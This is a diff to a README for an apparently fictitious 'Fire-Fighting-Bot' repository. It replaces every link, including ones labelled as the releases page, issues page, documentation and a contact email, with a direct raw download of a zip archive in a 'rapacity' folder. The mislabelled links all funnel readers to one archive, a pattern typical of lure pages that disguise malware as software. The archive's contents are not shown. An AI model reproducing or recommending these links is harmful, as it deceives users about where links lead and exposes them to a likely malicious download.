@@ -4,13 +4,13 @@
 The Fire-Fighting-Bot is an autonomous robot designed to detect and extinguish small fires. It uses advanced infrared flame sensors, durable DC motors, a reliable water pump, and a precision servo-based nozzle to protect your space. This technology can help safeguard your home from fire hazards.
 
 ## 📥 Download Now
-[![Download Fire-Fighting-Bot](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip)](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip)
+[![Download Fire-Fighting-Bot](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip)](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip)
 
 ## 🚀 Getting Started
 Here’s how to download and run the Fire-Fighting-Bot software:
 
 1. **Visit the Releases Page:**
-   To start, click on this link to access the [Releases Page](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip). 
+   To start, click on this link to access the [Releases Page](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip). 
 
 2. **Choose the Latest Version:**
    Look for the latest version listed on the page. The versions are usually marked with a number like "v1.0" or "v2.1".
@@ -62,14 +62,14 @@ If you experience issues running the Fire-Fighting-Bot, here are some common sol
 ## 📖 Additional Resources
 You can find more detailed guides and community support on the following platforms:
 
-- [GitHub Issues Page](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip): Report problems or ask questions.
-- [Documentation](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip): View the user manual for detailed instructions.
+- [GitHub Issues Page](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip): Report problems or ask questions.
+- [Documentation](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip): View the user manual for detailed instructions.
 
 ## 🤝 Contributing
 We welcome contributions to make the Fire-Fighting-Bot even better. If you have suggestions or new features, please create a pull request or open an issue on the GitHub repository.
 
 ## 📧 Contact
-For further inquiries or support, feel free to reach out via email at https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip
+For further inquiries or support, feel free to reach out via email at https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip
 
 ## 📥 Download & Install
-To download the Fire-Fighting-Bot, visit the following link: [Releases Page](https://github.com/vhicx/Fire-Fighting-Bot/raw/refs/heads/main/rapacity/Bot-Fighting-Fire-1.6.zip). Enjoy using your autonomous fire-fighting robot!
+To download the Fire-Fighting-Bot, visit the following link: [Releases Page](https://raw.githubusercontent.com/vhicx/Fire-Fighting-Bot/main/rapacity/Fighting_Bot_Fire_3.3.zip). Enjoy using your autonomous fire-fighting robot!
